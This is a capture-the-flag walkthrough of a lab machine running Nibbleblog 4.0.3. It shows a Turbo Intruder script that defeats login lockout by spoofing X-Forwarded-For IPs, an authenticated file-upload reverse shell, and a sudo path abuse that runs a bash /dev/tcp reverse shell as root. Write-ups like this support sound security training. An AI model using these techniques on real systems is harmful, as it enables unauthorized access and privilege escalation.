# Writeup 
## Recon

### rustscan

```
sudo rustscan -a 10.10.10.75 | tee rustscan.txt
```

![411c04a3857749281bfc85e8831817ab.png](../../_resources/411c04a3857749281bfc85e8831817ab-1.png)

### nmapAutomator

- This step's results were not used in the process (took too long), but I ran it in the background anyway.

```
sudo nmapAutomator.sh -H 10.10.10.75 -t Recon 
```

### Initial web enumeration

- Let's have a look around at the web server.

![4f809d8ae1e4127e21368489accd52cc.png](../../_resources/4f809d8ae1e4127e21368489accd52cc-1.png)

- In the page source, it looks like there is a `/nibbleblog` directory. Should be interesting.

![24fb73ec1de9e9b354ff7d69dcebd51c.png](../../_resources/24fb73ec1de9e9b354ff7d69dcebd51c-1.png)

![64d5f05e78196ffae9e46ae4f4af6322.png](../../_resources/64d5f05e78196ffae9e46ae4f4af6322-1.png)

### ffuf

- I decided to bruteforce the newly found `/nibbleblog` directory with ffuf and found some interesting php files and a README.

```
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.75/nibbleblog/FUZZ -e .php | tee ffuf-common.txt
```

![2f5bb1d5e9c4515c1a2d05df42cfdce8.png](../../_resources/2f5bb1d5e9c4515c1a2d05df42cfdce8-1.png)

### Further web enumeration

- Checking out the files found led to an admin login page, along with the nibbleblog version 4.0.3

![bff4f19063e2ff0e123b12b126d6544f.png](../../_resources/bff4f19063e2ff0e123b12b126d6544f-1.png)

![38ad9ef0b38d62e83d1f28ca3b3935f6.png](../../_resources/38ad9ef0b38d62e83d1f28ca3b3935f6-1.png)


### Finding file upload vulnerability (nibbleblog)

- Apparently, there is a file upload vulnerability in this version of nibbleblog, and this can be used later to upload a shell once the admin credentials are available (notice the "authenticated" part). 

![26dc03f3f5085f8bfef3d249a174792e.png](../../_resources/26dc03f3f5085f8bfef3d249a174792e-1.png)

![7284cc2a76893748e20da4182d7df726.png](../../_resources/7284cc2a76893748e20da4182d7df726-1.png)

## Initial Access

### Bruteforcing admin.php login with Burp Turbo Intruder extension

- Capturing a test login POST request for the admin.php page using Burp Proxy

![6246aff07b2d3ebd440499861b577c76.png](../../_resources/6246aff07b2d3ebd440499861b577c76-1.png)

- Attempting a manual bruteforce triggers a Nibbleblog blacklist protection (after 5 login attempts sent with Burp Repeater)

![dd2f760b4d8fafb63e2bbd2a644da8bb.png](../../_resources/dd2f760b4d8fafb63e2bbd2a644da8bb-1.png)

- ... but it turns out that it can be worked around by using the `X-Forwarded-For` header to spoof IPs (tested a couple of times in Burp Repeater)

- To automate the bruteforcing, I used Turbo Intruder (Burp extension) with a custom Python script that I wrote to rotate the spoofed IP and passwords according to the attempt limit. For starters, I just used the `admin` username and rockyou.txt for passwords. 

![ddba661bb70ac40bed8494f0d6c28c92.png](../../_resources/ddba661bb70ac40bed8494f0d6c28c92-1.png)


```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    ip_first = 0
    ip_last = 0
    limit = 5
    count = 0                       
    for password in open('/usr/share/wordlists/rockyou.txt'):
        
        engine.queue(target.req, [ip_first, ip_last, password.rstrip()])
        count += 1

        # attempt limit reached
        if count % limit == 0:
            # change spoofed IP
            ip_last += 1
            if ip_last == 256:
                ip_first += 1
                ip_last = 0
                

def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
```

- Success! The credentials are `admin:nibbles` (duh!)

![1d8fd6405382899a502234e5ff312c9b.png](../../_resources/1d8fd6405382899a502234e5ff312c9b-1.png)

![f3b4c474d967abec4bea2d63ee8d837f.png](../../_resources/f3b4c474d967abec4bea2d63ee8d837f-1.png)

![94dc688abdb40f6eba1ea90311cb96e2.png](../../_resources/94dc688abdb40f6eba1ea90311cb96e2-1.png)


### Triggering file upload vulnerability (nibbleblog) for php shell

- Now that admin access is available, the code execution vulnerability from recon should work. 

![e44b25862328c7c978278d1b40629cac.png](../../_resources/e44b25862328c7c978278d1b40629cac-1.png)

- Visited `http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=install&plugin=my_image` to activate the vulnerable plugin

![b0a0d3d13800211112d0d195aa1479cb.png](../../_resources/b0a0d3d13800211112d0d195aa1479cb-1.png)

- Configured php-reverse-shell from pentestmonkey to upload

![41d5e3a6f2920cf22ddb5cb8e292d702.png](../../_resources/41d5e3a6f2920cf22ddb5cb8e292d702-1.png)

- Clicked "Configure" on the "My image" plugin on the Plugins page and uploaded the php-reverse-shell using the "Browse" button (and then "Save changes")

![ef15c0135ea6f713eb0c3c2693c2f8c5.png](../../_resources/ef15c0135ea6f713eb0c3c2693c2f8c5-1.png)

- Result: 

![1624eb4e3e0f81cf0509e33e5b8422e9.png](../../_resources/1624eb4e3e0f81cf0509e33e5b8422e9-1.png)

- Started a netcat listener on Kali to catch the shell

```
rlwrap nc -nvlp 1337
```

- Activated the php-reverse-shell by navigating to `http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php` and voila!

![24f5659bd33fbb8f7982b27de287212f.png](../../_resources/24f5659bd33fbb8f7982b27de287212f-1.png)

- Ran `whoami` and `cat /etc/passwd` for system enumeration

![f48dd85eb81c20e97d665c7321fe42dc.png](../../_resources/f48dd85eb81c20e97d665c7321fe42dc-1.png)

- Ran `ls` in `/home/nibbler` to list files. User flag done!

![dd4bdc1e29d6c62e59278963c5a1f830.png](../../_resources/dd4bdc1e29d6c62e59278963c5a1f830-1.png)

- But what is this `personal.zip` file about? 

## Privesc

### Exploiting sudo misconfiguration (user-controlled path) for root execution

- Running `sudo -l` to see what the user can run with sudo yielded a script that could be used for privilege escalation. 

![73fe16538ae5dd2b097bf6a24d6c9ff7.png](../../_resources/73fe16538ae5dd2b097bf6a24d6c9ff7-1.png)

- I unzipped the `personal.zip` to examine the `personal` folder.

![b889f8e65243f4eb9b338994c84bfd0a.png](../../_resources/b889f8e65243f4eb9b338994c84bfd0a-1.png)

- ...and ran `cat personal/stuff/monitor.sh` to examine the file

```
                  #################################################################################################### 
                  #                                        Tecmint_monitor.sh                                        # 
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      # 
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    # 
                  # giving proper credit to Tecmint.com and Author                                                   #                    
                  #                                                                                                  #
                  #################################################################################################### 
#! /bin/bash                                               
# unset any variable which system may be using             
                                                                                                                      
# clear the screen                                         
clear                                                                                                                 
                                                                                                                      
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage                             
...
```

- It's important to realize that the content of `monitor.sh` doesn't really matter. The fact of the matter is, since the user has control of the `/home/nibbler/` directory, `monitor.sh` can be ANY script that the user wants. In this case, a reverse shell that runs as root would be good enough.

- First, I started a netcat listener on Kali to catch the root shell.

```
rlwrap nc -nvlp 31337
```

- Then, I created a new `monitor.sh` file on the target machine to open a reverse shell, running it with sudo. 

```
mkdir -p personal/stuff
cd personal/stuff
echo "#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.4/31337 0>&1;" > monitor.sh
chmod +x monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

- Success! Root flag done!

![b2ee207944cb812983abb3467327bee9.png](../../_resources/b2ee207944cb812983abb3467327bee9-1.png)